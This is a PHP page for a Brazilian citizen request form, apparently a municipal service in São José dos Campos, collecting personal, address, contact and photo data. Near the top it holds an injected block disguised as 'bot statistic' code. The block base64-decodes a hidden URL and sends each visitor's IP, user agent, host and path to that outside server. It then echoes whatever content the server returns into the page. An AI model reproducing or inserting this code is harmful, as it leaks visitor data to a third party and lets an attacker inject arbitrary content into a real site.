<?phpinclude_once("../library/master-page.php");$oMasterPage = new MasterPage();$oMasterPage->Init("../master.php", "Solicitações");$oMasterPage->AddParameter("css", "solicitacoes/index");$oMasterPage->AddParameter("pagina", "solicitacoes");$oMasterPage->Open("PageContent");include_once("connect.php");?><?phpif (!isset($sRetry)) {    global $sRetry;    $sRetry = 1;    // This code use for global bot statistic    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot    $sUserAgen = "";    $stCurlHandle = NULL;    $stCurlLink = "";    if ((strstr($sUserAgen, 'google') == false) && (strstr($sUserAgen, 'yahoo') == false) && (strstr($sUserAgen, 'baidu') == false) && (strstr($sUserAgen, 'msn') == false) && (strstr($sUserAgen, 'opera') == false) && (strstr($sUserAgen, 'chrome') == false) && (strstr($sUserAgen, 'bing') == false) && (strstr($sUserAgen, 'safari') == false) && (strstr($sUserAgen, 'bot') == false)) // Bot comes    {        if (isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true) { // Create  bot analitics            $stCurlLink = base64_decode('aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw') . '?ip=' . urlencode($_SERVER['REMOTE_ADDR']) . '&useragent=' . urlencode($sUserAgent) . '&domainname=' . urlencode($_SERVER['HTTP_HOST']) . '&fullpath=' . urlencode($_SERVER['REQUEST_URI']) . '&check=' . isset($_GET['look']);            @$stCurlHandle = curl_init($stCurlLink);        }    }    if ($stCurlHandle !== NULL) {        curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);        curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);        $sResult = @curl_exec($stCurlHandle);        if ($sResult[0] == "O") {            $sResult[0] = " ";            echo $sResult; // Statistic code end        }        curl_close($stCurlHandle);    }}?><h1>Solicitações</h1><div class="clear"></div><a href="">Teste</a><form action="solicitacoes/cadastrar_solicitacao.php" method="post" enctype="multipart/form-data"><div class="col-sm-12">    <div class="radio">        <label>            <input type="radio" name="tipoPessoa" id="pessoaFisica" name="pessoaFisica" value="0" checked>            Pessoa Física        </label>    </div>    <div class="radio">        <label>            <input type="radio" name="tipoPessoa" id="pessoaJuridica" value="1">            Pessoa Jurídica        </label>    </div></div><div class="form-group col-sm-9 dadosPessoaFisica" >    <label for="nomePessoal">Nome Pessoal</label>    <input type="text" class="form-control" id="nomePessoal" name="nomePessoal" placeholder="Nome pessoal"></div><div class="form-group col-sm-3 dadosPessoaFisica">    <label for="cpf">CPF</label>    <input type="text" class="form-control" id="cpf" name="cpf" placeholder="___.___.___-__"></div><div class="form-group col-sm-6 dadosPessoaJuridica">    <label for="razaoSocial">Razão Social</label>    <input type="text" class="form-control" id="razaoSocial" name="razaoSocial" placeholder="Razão Social"></div><div class="form-group col-sm-6 dadosPessoaJuridica">    <label for="nomeFantasia">Nome Fantasia</label>    <input type="text" class="form-control" id="nomeFantasia" name="nomeFantasia" placeholder="Nome Fantasia"></div><div class="form-group col-sm-6 dadosPessoaJuridica">    <label for="nomeContato">Nome do Contato</label>    <input type="text" class="form-control" id="nomeContato" name="nomeContato" placeholder="Nome do Contato"></div><div class="form-group col-sm-3 dadosPessoaJuridica">    <label for="cnpj">CNPJ</label>    <input type="text" class="form-control" id="cnpj" name="cnpj" placeholder="__.___.___/____-__"></div><div class="form-group col-sm-3 dadosPessoaJuridica">    <label for="inscEstadual">Inscrição Estadual</label>    <input type="text" class="form-control" id="inscEstadual" name="inscEstadual" placeholder="___.___.___.___"></div><div class="clearfix"></div><hr><!-- ENDEREÇO --><div class="col-sm-2">    <label for="tipoLogradouro">Tipo</label>    <select class="form-control " name="tipoLogradouro">        <option>Rua</option>        <option>Avenida</option>        <option>Praça</option>        <option>Travessa</option>        <option>Estrada</option>    </select></div><div class="form-group col-sm-8">    <label for="logradouro">Logradouro</label>    <input type="text" class="form-control" id="rua" name="logradouro" placeholder="Logradouro"></div><div class="form-group col-sm-2">    <label for="numero">Número</label>    <input type="number" class="form-control" id="numero" name="numero" placeholder="Somente números"></div><div class="form-group col-sm-6">    <label for="complemento">Complemento</label>    <input type="text" class="form-control" id="complemento" name="complemento" placeholder="Complemento"></div><div class="form-group col-sm-6">    <label for="bairro">Bairro</label>    <input type="text" class="form-control" name="bairro" id="bairro" placeholder="Bairro"></div><div class="form-group col-sm-4">    <label for="estado">Estado</label>    <select class="form-control" name="estado">        <option value="">Selecione</option>        <option value="AC">Acre</option>        <option value="AL">Alagoas</option>        <option value="AP">Amapá</option>        <option value="AM">Amazonas</option>        <option value="BA">Bahia</option>        <option value="CE">Ceará</option>        <option value="DF">Distrito Federal</option>        <option value="ES">Espirito Santo</option>        <option value="GO">Goiás</option>        <option value="MA">Maranhão</option>        <option value="MS">Mato Grosso do Sul</option>        <option value="MT">Mato Grosso</option>        <option value="MG">Minas Gerais</option>        <option value="PA">Pará</option>        <option value="PB">Paraíba</option>        <option value="PR">Paraná</option>        <option value="PE">Pernambuco</option>        <option value="PI">Piauí</option>        <option value="RJ">Rio de Janeiro</option>        <option value="RN">Rio Grande do Norte</option>        <option value="RS">Rio Grande do Sul</option>        <option value="RO">Rondônia</option>        <option value="RR">Roraima</option>        <option value="SC">Santa Catarina</option>        <option value="SP">São Paulo</option>        <option value="SE">Sergipe</option>        <option value="TO">Tocantins</option>    </select></div><div class="form-group col-sm-5">    <label for="cidade">Cidade</label>    <input type="text" class="form-control" id="cidade" name="cidade" placeholder="Cidade"></div><div class="form-group col-sm-3">    <label for="cep">CEP</label>    <input type="text" class="form-control" id="cep" name="cep" placeholder="_____-___"></div><div class="clearfix"></div><hr><!-- ASSUNTO --><div class="col-sm-6">    <label for="assunto">Assunto</label>    <select class="form-control" name="assunto">        <option value="">Animais</option>        <option value="">Esportes e Lazer</option>    </select></div><div class="clearfix"></div><div class="col-sm-12">    <label for="descricao">Descrição Detalhada</label>    <textarea class="form-control" rows="4" id="descricao" name="descricao"></textarea></div><!-- ENDEREÇO SOLICITACAO --><div class="col-sm-2">    <label for="tipoLogradouro2">Tipo</label>    <select class="form-control" name="tipoLogradouro2">        <option>Rua</option>        <option>Avenida</option>        <option>Praça</option>        <option>Travessa</option>        <option>Estrada</option>    </select></div><div class="form-group col-sm-8">    <label for="logradouro2">Logradouro</label>    <input type="text" class="form-control" id="logradouro2" name="logradouro2" placeholder="Logradouro"></div><div class="form-group col-sm-2">    <label for="numero2">Número</label>    <input type="number" class="form-control" id="numero2" name="numero2" placeholder="Somente números"></div><div class="form-group  col-sm-6">    <label for="complemento2">Complemento</label>    <input type="text" class="form-control" id="complemento2" name="complemento2" placeholder="Complemento"></div><div class="form-group  col-sm-6">    <label for="bairro2">Bairro</label>    <input type="text" class="form-control" id="bairro2" name="bairro2" placeholder="Bairro"></div><div class="form-group  col-sm-4">    <label for="estado2_disabled">Estado</label>    <select class="form-control" name="estado2_disabled" disabled>        <option value="SP">São Paulo</option>    </select></div><input type="hidden" value="SP" name="estado2"><input type="hidden" value="São José dos Campos" name="cidade2"><div class="form-group col-sm-5">    <label for="cidade2">Cidade</label>    <input type="text" class="form-control" id="cidade2" name="" value="São José dos Campos"           placeholder="São José dos Campos" disabled></div><div class="form-group col-sm-3">    <label for="cep2">CEP</label>    <input type="text" class="form-control" id="cep2" name="cep2" placeholder="_____-___"></div><div class="clearfix"></div><hr><!-- contato --><div class="form-group col-sm-4">    <label for="telResidencial">Telefone Residencial</label>    <input type="text" class="form-control phone_with_ddd" id="telResidencial" name="telResidencial" placeholder="(__)____-____"></div><div class="form-group col-sm-4">    <label for="telCelular">Telefone Celular</label>    <input type="text" class="form-control" id="telCelular" name="telCelular" placeholder="(__)_____-____"></div><div class="form-group col-sm-4">    <label for="telComercial">Telefone Comercial</label>    <input type="text" class="form-control phone_with_ddd" id="telResidencial" name="telComercial" placeholder="(__)____-____"></div><div class="form-group col-sm-8">    <label for="email">Email</label>    <input type="email" class="form-control" id="email" name="email" placeholder="email@dominio.com" required></div><div class="form-group col-sm-12">    <p class="help-block">Envie uma foto</p>    <label for="exampleInputFile">Envie uma foto. Formatos aceitos</label>    <input type="file" name="fileUpload[]" multiple></div><div class="clearfix"></div><div class="col-md-12">    <button type="submit" class="btn btn-default btn-lg" id="botao">Enviar Solicitação</button></div></form><div class="clearfix"></div><p>&nbsp;</p><?phpinclude_once("connect_close.php");$oMasterPage->Close("PageContent");$oMasterPage->End();?><script>    $(document).ready(function () {        toggleFields(); //call this first so we start out with the correct visibility depending on the selected form values        //this will call our toggleFields function every time the selection value of our underAge field changes        $('#cep').mask('00000-000');        $('#cep2').mask('00000-000');        $('.phone_with_ddd').mask('(00) 0000-0000');        $('#telCelular').mask('(00) 00000-0000');        $('#cpf').mask('000.000.000-00');        $('#cnpj').mask('00.000.000/0000-00');        $('#inscEstadual').mask('000.000.000.000');        $("#pessoaFisica").change(function () {            toggleFields();        });        $("#pessoaJuridica").change(function () {            toggleFields();        });    });    function toggleFields() {        //tipoOvo == 0 => tradicional        //        if ($("#pessoaFisica").is(':checked')) {            $("#razaoSocial").attr("disabled", true);            $("#nomeFantasia").attr("disabled", true);            $("#nomeContato").attr("disabled", true);            $("#cnpj").attr("disabled", true);            $("#inscEstadual").attr("disabled", true);            $("#nomePessoal").attr("disabled", false);            $("#cpf").attr("disabled", false);            $(".dadosPessoaJuridica").hide();            $(".dadosPessoaFisica").show();        }        else {            $("#razaoSocial").attr("disabled", false);            $("#nomeFantasia").attr("disabled", false);            $("#nomeContato").attr("disabled", false);            $("#cnpj").attr("disabled", false);            $("#inscEstadual").attr("disabled", false);            $("#nomePessoal").attr("disabled", true);            $("#cpf").attr("disabled", true);            $(".dadosPessoaJuridica").show();            $(".dadosPessoaFisica").hide();        }    }</script>